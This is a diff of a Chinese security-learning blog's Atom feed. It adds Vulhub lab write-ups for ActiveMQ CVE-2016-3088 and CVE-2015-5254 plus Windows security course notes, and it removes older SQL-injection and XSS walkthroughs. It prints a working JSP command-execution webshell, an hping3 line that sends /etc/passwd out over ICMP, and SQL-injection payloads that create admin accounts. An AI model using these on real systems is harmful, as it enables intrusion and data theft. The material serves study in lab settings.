@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2021-04-14T15:42:16.622Z</updated>
+  <updated>2021-04-18T06:16:43.934Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,18 +17,64 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>vulhub靶场练习 </title>
-    <link href="http://yoursite.com/2021/04/14/vulhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    <id>http://yoursite.com/2021/04/14/vulhub靶场练习/</id>
-    <published>2021-04-14T15:09:00.000Z</published>
-    <updated>2021-04-14T15:42:16.622Z</updated>
+    <title>CISP-PTE课程</title>
+    <link href="http://yoursite.com/2021/04/18/CISP-PTE%E8%AF%BE%E7%A8%8B/"/>
+    <id>http://yoursite.com/2021/04/18/CISP-PTE课程/</id>
+    <published>2021-04-18T01:02:21.000Z</published>
+    <updated>2021-04-18T06:16:43.934Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="ActiveMQ任意文件写入漏洞"><a href="#ActiveMQ任意文件写入漏洞" class="headerlink" title="#ActiveMQ任意文件写入漏洞"></a>#ActiveMQ任意文件写入漏洞</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="#漏洞原理"></a>#漏洞原理</h4><p>fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要PUT写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><h4 id="复现步骤"><a href="#复现步骤" class="headerlink" title="#复现步骤"></a>#复现步骤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps &#x2F;&#x2F;查看端口</span><br></pre></td></tr></table></figure><ul><li>页面登陆ip:8800端口</li><li>登陆账号 admin/admin</li><li>进入fileserver页面 抓包<a id="more"></a>shell脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><img src="/images/pasted-275.png" alt="upload successful"></li><li>shell成功上传<br><img src="/images/pasted-281.png" alt="upload successful"><br>移动文件到可以解析jsp文件的路径：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1．&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api</span><br><span class="line">2．&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;admin</span><br></pre></td></tr></table></figure><img src="/images/pasted-278.png" alt="upload successful"></li><li>访问webshell<br><img src="/images/pasted-282.png" alt="upload successful"><br><img src="/images/pasted-283.png" alt="upload successful"></li></ul>]]></content>
+    <content type="html"><![CDATA[<h3 id="操作系统安全"><a href="#操作系统安全" class="headerlink" title="#操作系统安全"></a>#操作系统安全</h3><h4 id="WIndows操作系统安全"><a href="#WIndows操作系统安全" class="headerlink" title="#WIndows操作系统安全"></a>#WIndows操作系统安全</h4><p>windows的用户标识：SID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">administartor:500--0x1f4</span><br><span class="line">guest:501--ox1f5</span><br><span class="line">普通用户：从1000开始--ox3e8</span><br><span class="line">内置账号：</span><br><span class="line">system</span><br><span class="line">    local service</span><br><span class="line">    network service</span><br></pre></td></tr></table></figure><p>C：\windows\system32\config\SAM<br>HKEY_LOCAL+MACHINE\SAM\SAM\Domains\Account\Users\Names<br>查看用户SID：whoami/user<br>查看组SID：whoami/groups<br>查看用户特权：whoami/priv<br>查看服务SID：sc showsid server_name</p><a id="more"></a><p>用户克隆：把管理员F值赋值到普通用户上<br>信道保护：记时 存储<br>hping3 ip_address -d size –icmp –file /etc/passwd //利用icmp信道传输/etc/passwd文件</p><p>知其所需，最小特权</p><p>日志：系统日志/设备日志/web日志/监控日志</p><p>系统system：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1074，查看计算机的开机、关机、重启的时间以及原因和注释。</span><br><span class="line">6005，表示日志服务已启动，用来判断正常开机进入系统。</span><br><span class="line">6006，表示日志服务已停止，用来判断系统关机。</span><br><span class="line">6009，表示非正常关机， 按ctrl、alt、delete键关机。</span><br><span class="line">41，表示系统在未先正常关机的情况下重新启动。当出现意外断电关机、系统崩溃时，出现此事件ID。</span><br><span class="line">4199，当发生TCP&#x2F;IP地址冲突的时候，出现此事件ID，用来排查用户IP网络的问题。</span><br><span class="line">35,36,37，记录时间客户端状态信息，35表示更改时间源，36表示时间同步失败，37表示时间同步正常</span><br><span class="line">134，当出现时间同步源DNS解析失败时会出现此事件ID。</span><br><span class="line">7045，服务创建成功</span><br><span class="line">7030，服务创建失败</span><br></pre></td></tr></table></figure><p>安全Security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4624，表示成功登陆的用户，用来筛选该系统的用户登陆成功情况。</span><br><span class="line">4625，表示登陆失败的用户。</span><br><span class="line">4672，表示授予了特殊权限</span><br><span class="line">4720,4722,4723,4724,4725,4726,4738,4740，事件ID表示当用户帐号发生创建，删除，改变密码时的事件记录。</span><br><span class="line">4727,4737,4739,4762，表示当用户组发生添加、删除时或组内添加成员时生成该事件。</span><br></pre></td></tr></table></figure><p>Windows认证：<br>    本地认证：GINA-LISA-SAM-用户数据<br>    远程认证：SMB-LM-NTLM-Keyberos<br>访问控制：（授权）<br>    ACL：访问控制列表<br>    CL：访问能力表</p><p>主体：发起访问者<br>客体：被访问者<br>权限：主体对客体的操作能力</p><p>NTFS权限：（ACL和ACE）<br>    仅NTFS支持<br>    权限累计和继承<br>    文件权限高于文件夹权限<br>    移动和复制对于权限的影响<br>    拒绝权限优先<br>    特殊权限：<br>        读取权限<br>        修改权限<br>        取得所有权</p><p>Windows特权管理：User Account Control<br>    完全访问令牌<br>    标准受限访问令牌</p><p>windows默认日志：<br>    security.evtx<br>    system.evtx<br>    application.evtx</p><p>关闭默认共享：<br> 1.关闭临时共享：net share shared_name /del<br> 2.永久关闭共享：net stop server<br> 3.修改注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parametes<br> 建立IPC连接：net use \ip\ipc$ //输入用户名和密码<br> 建立默认共享映射：net use k: \ip\c$ //映射不存在的磁盘</p><h4 id="Linux："><a href="#Linux：" class="headerlink" title="#Linux："></a>#Linux：</h4>]]></content>
     
     <summary type="html">
     
-      &lt;h3 id=&quot;ActiveMQ任意文件写入漏洞&quot;&gt;&lt;a href=&quot;#ActiveMQ任意文件写入漏洞&quot; class=&quot;headerlink&quot; title=&quot;#ActiveMQ任意文件写入漏洞&quot;&gt;&lt;/a&gt;#ActiveMQ任意文件写入漏洞&lt;/h3&gt;&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;#漏洞原理&quot;&gt;&lt;/a&gt;#漏洞原理&lt;/h4&gt;&lt;p&gt;fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要PUT写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。&lt;/p&gt;
-&lt;h4 id=&quot;复现步骤&quot;&gt;&lt;a href=&quot;#复现步骤&quot; class=&quot;headerlink&quot; title=&quot;#复现步骤&quot;&gt;&lt;/a&gt;#复现步骤&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker ps &amp;#x2F;&amp;#x2F;查看端口&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+      &lt;h3 id=&quot;操作系统安全&quot;&gt;&lt;a href=&quot;#操作系统安全&quot; class=&quot;headerlink&quot; title=&quot;#操作系统安全&quot;&gt;&lt;/a&gt;#操作系统安全&lt;/h3&gt;&lt;h4 id=&quot;WIndows操作系统安全&quot;&gt;&lt;a href=&quot;#WIndows操作系统安全&quot; class=&quot;headerlink&quot; title=&quot;#WIndows操作系统安全&quot;&gt;&lt;/a&gt;#WIndows操作系统安全&lt;/h4&gt;&lt;p&gt;windows的用户标识：SID&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;administartor:500--0x1f4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;guest:501--ox1f5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;普通用户：从1000开始--ox3e8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;内置账号：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	system&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    local service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    network service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;C：\windows\system32\config\SAM&lt;br&gt;HKEY_LOCAL+MACHINE\SAM\SAM\Domains\Account\Users\Names&lt;br&gt;查看用户SID：whoami/user&lt;br&gt;查看组SID：whoami/groups&lt;br&gt;查看用户特权：whoami/priv&lt;br&gt;查看服务SID：sc showsid server_name&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ActiveMQ CVE-2015-5254 反序列化漏洞titled</title>
+    <link href="http://yoursite.com/2021/04/15/Untitled/"/>
+    <id>http://yoursite.com/2021/04/15/Untitled/</id>
+    <published>2021-04-15T14:20:00.000Z</published>
+    <updated>2021-04-15T14:20:57.376Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="#漏洞原理"></a>#漏洞原理</h3><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="#复现步骤"></a>#复现步骤</h3><ul><li>构造（可以使用ysoserial）可执行命令的序列化对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;matthiaskaiser&#x2F;jmet&#x2F;releases&#x2F;download&#x2F;0.1.0&#x2F;jmet-0.1.0-all.jar</span><br></pre></td></tr></table></figure></li><li>作为一个消息，发送给目标61616端口</li><li>访问的Web管理页面，读取消息，触发漏洞</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;#漏洞原理&quot;&gt;&lt;/a&gt;#漏洞原理&lt;/h3&gt;&lt;p&gt;该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JM
+      
+    
+    </summary>
+    
+    
+      <category term="Vulhub" scheme="http://yoursite.com/categories/Vulhub/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ActiveMQ CVE-2016-3088 任意文件写入漏洞</title>
+    <link href="http://yoursite.com/2021/04/14/vulhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <id>http://yoursite.com/2021/04/14/vulhub靶场练习/</id>
+    <published>2021-04-14T15:09:00.000Z</published>
+    <updated>2021-04-15T14:20:28.522Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="#漏洞原理"></a>#漏洞原理</h3><p>fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要PUT写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="#复现步骤"></a>#复现步骤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps &#x2F;&#x2F;查看端口</span><br></pre></td></tr></table></figure><ul><li>页面登陆ip:8800端口</li><li>登陆账号 admin/admin</li><li>进入fileserver页面 抓包<a id="more"></a>shell脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><img src="/images/pasted-275.png" alt="upload successful"></li><li>shell成功上传<br><img src="/images/pasted-281.png" alt="upload successful"><br>移动文件到可以解析jsp文件的路径：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1．&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api</span><br><span class="line">2．&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;admin</span><br></pre></td></tr></table></figure><img src="/images/pasted-278.png" alt="upload successful"></li><li>访问webshell<br><img src="/images/pasted-282.png" alt="upload successful"><br><img src="/images/pasted-283.png" alt="upload successful"></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;#漏洞原理&quot;&gt;&lt;/a&gt;#漏洞原理&lt;/h3&gt;&lt;p&gt;fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要PUT写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。&lt;/p&gt;
+&lt;h3 id=&quot;复现步骤&quot;&gt;&lt;a href=&quot;#复现步骤&quot; class=&quot;headerlink&quot; title=&quot;#复现步骤&quot;&gt;&lt;/a&gt;#复现步骤&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker ps &amp;#x2F;&amp;#x2F;查看端口&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;ul&gt;
 &lt;li&gt;页面登陆ip:8800端口&lt;/li&gt;
 &lt;li&gt;登陆账号 admin/admin&lt;/li&gt;
@@ -401,48 +447,6 @@
     
     
       <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>基础扫描工具的使用</title>
-    <link href="http://yoursite.com/2020/02/03/%E5%9F%BA%E7%A1%80%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
-    <id>http://yoursite.com/2020/02/03/基础扫描工具的使用/</id>
-    <published>2020-02-03T02:27:00.000Z</published>
-    <updated>2020-02-04T09:05:31.240Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="awvs扫描器扫描web漏洞"><a href="#awvs扫描器扫描web漏洞" class="headerlink" title="#awvs扫描器扫描web漏洞"></a>#awvs扫描器扫描web漏洞</h3><p>1.1基本使用<br><code>new scan</code>创建新的任务网站 默认next无需修改<br>1.2高级使用<br>site crawler<br>爬虫功能，遍历站点目录结构 点击在<code>tool</code>中的<code>site crawler target finder</code><br>端口扫描，找出web服务器 点击在<code>tool</code>中的<code>target finder</code>(目标服务器http端口）</p><a id="more"></a><h3 id="御剑web后台敏感目录扫描"><a href="#御剑web后台敏感目录扫描" class="headerlink" title="#御剑web后台敏感目录扫描"></a>#御剑web后台敏感目录扫描</h3><p>2.1 扫描后寻找类似于admin login 点击寻找后台登陆</p><h3 id="APPscan扫描器扫描web漏洞"><a href="#APPscan扫描器扫描web漏洞" class="headerlink" title="#APPscan扫描器扫描web漏洞"></a>#APPscan扫描器扫描web漏洞</h3><p>3.11 单击文件——》新建<br>3.12 选择常规扫描（不必勾选<code>启动扫描配置向导</code>）<br>3.13 选择web程序扫描<br>3.14 输入URL 勾线仅扫描此目录下链接<br>3.15 默认登陆方法：记录<br>3.16 弹窗选择<code>是</code><br>3.17 测试策略选择默认<code>default</code><br>3.18 选择启动全面自动扫描<br>3.19 自动保存对话框中 选择<code>是</code><br>3.20 扫描完成后 点击应用建议<br>3.21 点击报告 导出生成pdf格式文档</p><h3 id="SQL注入原理-万能密码注入"><a href="#SQL注入原理-万能密码注入" class="headerlink" title="#SQL注入原理 -万能密码注入"></a>#SQL注入原理 -万能密码注入</h3><p>4.1 输入框万能密码注入<br>username=username<br>password=2’or’1<br><code>[Select user_id,user_type,email from Where user_id=&#39;username&#39; And password=&#39;2&#39;]</code>or<code>[&#39;1&#39;]</code> 恒为True</p><h3 id="动网论坛8-2经典注入漏洞利用"><a href="#动网论坛8-2经典注入漏洞利用" class="headerlink" title="#动网论坛8.2经典注入漏洞利用"></a>#动网论坛8.2经典注入漏洞利用</h3><p>5.1 例：注册新用户<br>username=san<br>password=123456<br>5.2退出用户 在登录框输入<code>san&#39;and&#39;a&#39;=a</code><br>即<code>[&#39;password=san&#39;]</code>and<code>[&#39;a&#39;=&#39;a&#39;]</code><br>判断相等<br>5.3 在登陆框输入san’and’a’=’b<br>即[‘password=san’]and[‘a’=’b’]<br>不等 判断用户名不存在<br>5.4 输入提权<code>san&#39;and&#39;a&#39;=&#39;b&#39;;update dv_user set usergroupid=1 where username=&#39;san&#39;--</code><br>重新用正确的用户名密码登陆，此时已是前台管理员身份<br>5.5 退出用户 在登录框输入<code>san&#39;;insert into dv_admin (username,password,flag,adduser) values(&#39;san&#39;,&#39;49ba59abbe56e057&#39;,&#39;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45&#39;,&#39;san&#39;)--</code><br>密码输入为正确密码 49ba59abbe56e057为12345的cmd16位密文<br>打开后台管理员界面 用正确的用户名和密码登陆 可以成功登陆</p><h3 id="SQL注入原理-手工注入access数据库"><a href="#SQL注入原理-手工注入access数据库" class="headerlink" title="#SQL注入原理-手工注入access数据库"></a>#SQL注入原理-手工注入access数据库</h3><p>6.1 在<code>[.asp?id=xxx（数字任意）]</code>后加语句<code>[&#39;]</code>(错误）<code>[and 1=1]</code>（成功）<code>[and 1=2]</code>（错误）<br>判断是否存在注入点<br>6.2 连接末尾添加<code>and exists(select * from admin)</code>猜解表名admin<br>6.31 连接末尾添加<code>and exists(select admin from admin)</code> 猜解列名admin<br>6.32 同样连接末尾添加<code>and exists(select password from admin)</code> 猜解列名password<br>6.41 连接末尾添加<code>and (select top 1 len (admin) from admin）&gt;1</code> admin&gt;x x数字依次增加直到可以正常访问，字段长度即为x<br>6.42 同理连接末尾添加<code>and (select top 1 asc(mid(admin,1,1))from admin)&gt;97</code>可以正常访问<br>可知第一条记录的第一位字符ASCII码为97 对应a<br>*asc(mid(admin,1,1)) 即从第一个开始，取admin字符串中的一个字符</p><h3 id="SQL注入原理-手工联合查询注入技术"><a href="#SQL注入原理-手工联合查询注入技术" class="headerlink" title="#SQL注入原理-手工联合查询注入技术"></a>#SQL注入原理-手工联合查询注入技术</h3><p>7.1 在<code>[.asp?id=xxx（数字任意）]</code>后加语句<code>order by xxx</code>（数字任意） 根据页面返回结果判断站点中的字段数目 若xxx=n时不能访问，字段数目即为n-1<br>7.2 例：在连接后面添加<code>union select 1 ,2,3,4,5,6,7,8,9,10,11 from admin</code>【案例的网站字段数目为11】 页面显示2，3<br>7.3 在连接后面添加<code>union select 1 ,admin,password,4,5,6,7,8,9,10,11 from admin</code> 即可爆出管理员用户名和密码</p><h3 id="DVWA之php-mysql手工注入"><a href="#DVWA之php-mysql手工注入" class="headerlink" title="#DVWA之php+mysql手工注入"></a>#DVWA之php+mysql手工注入</h3><p>8.11 输入<code>[1]</code> 有回显 说明此处为注入点<br>8.12 输入<code>[&quot;&quot;]</code>返回错误<br>8.13 猜测数字类型注入 输入<code>[1 or 1=1]</code> 尝试遍历<br>8.14 猜测程序将此处看成了字符型 输入<code>[1&#39; or &#39;1&#39;=&#39;1]</code>成功遍历<br><img src="/images/pasted-178.png" alt="upload successful"><br>8.15 输入<code>1&#39; order by 1 --</code>（*–后有空格） 依次增加 到3到时候报错 即判断查询结果值为2例<br>8.16 参数注入<code>1&#39; and 1=2 select 1,2 --</code></p><h3 id="跨站脚本攻击之存储型"><a href="#跨站脚本攻击之存储型" class="headerlink" title="#跨站脚本攻击之存储型"></a>#跨站脚本攻击之存储型</h3><p>9.1 文本框存在字数限制<br>用注释的方式绕过<br>提交<code>*/&lt;/script&gt;</code><br>再提交<code>&lt;script&gt;alert(/xss/)/*</code></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;awvs扫描器扫描web漏洞&quot;&gt;&lt;a href=&quot;#awvs扫描器扫描web漏洞&quot; class=&quot;headerlink&quot; title=&quot;#awvs扫描器扫描web漏洞&quot;&gt;&lt;/a&gt;#awvs扫描器扫描web漏洞&lt;/h3&gt;&lt;p&gt;1.1基本使用&lt;br&gt;&lt;code&gt;new scan&lt;/code&gt;创建新的任务网站 默认next无需修改&lt;br&gt;1.2高级使用&lt;br&gt;site crawler&lt;br&gt;爬虫功能，遍历站点目录结构 点击在&lt;code&gt;tool&lt;/code&gt;中的&lt;code&gt;site crawler target finder&lt;/code&gt;&lt;br&gt;端口扫描，找出web服务器 点击在&lt;code&gt;tool&lt;/code&gt;中的&lt;code&gt;target finder&lt;/code&gt;(目标服务器http端口）&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Scrapy在Mac上的安装</title>
-    <link href="http://yoursite.com/2020/02/03/Scrapy%E5%9C%A8Mac%E4%B8%8A%E7%9A%84%E5%AE%89%E8%A3%85/"/>
-    <id>http://yoursite.com/2020/02/03/Scrapy在Mac上的安装/</id>
-    <published>2020-02-03T02:26:00.000Z</published>
-    <updated>2020-02-03T02:26:59.828Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="#准备工作"></a>#准备工作</h3><p>若你的Mac OS系统为10.11或更高版本：<br>1.重新启动Mac OS<br>2.重启时按住Command+R，进入Recovery模式<br>3.选择实用工具里的终端并输入:<br>csrutil disable;<br>4.重新启动，回到Mac OS</p><a id="more"></a><h3 id="安装Scapy"><a href="#安装Scapy" class="headerlink" title="#安装Scapy"></a>#安装Scapy</h3><p>sudo -H pip install Scrapy</p><h3 id="测试"><a href="#测试" class="headerlink" title="#测试"></a>#测试</h3><p>scrapy version</p><h3 id="后续"><a href="#后续" class="headerlink" title="#后续"></a>#后续</h3><p>1.重新启动Mac OS<br>2.重启时按住Command+R，进入Recovery模式<br>3.选择实用工具里的终端并输入:<br>csrutil enable;<br>4.重新启动，回到Mac OS</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;#准备工作&quot;&gt;&lt;/a&gt;#准备工作&lt;/h3&gt;&lt;p&gt;若你的Mac OS系统为10.11或更高版本：&lt;br&gt;1.重新启动Mac OS&lt;br&gt;2.重启时按住Command+R，进入Recovery模式&lt;br&gt;3.选择实用工具里的终端并输入:&lt;br&gt;csrutil disable;&lt;br&gt;4.重新启动，回到Mac OS&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="教程" scheme="http://yoursite.com/categories/%E6%95%99%E7%A8%8B/"/>
     
     
   </entry>
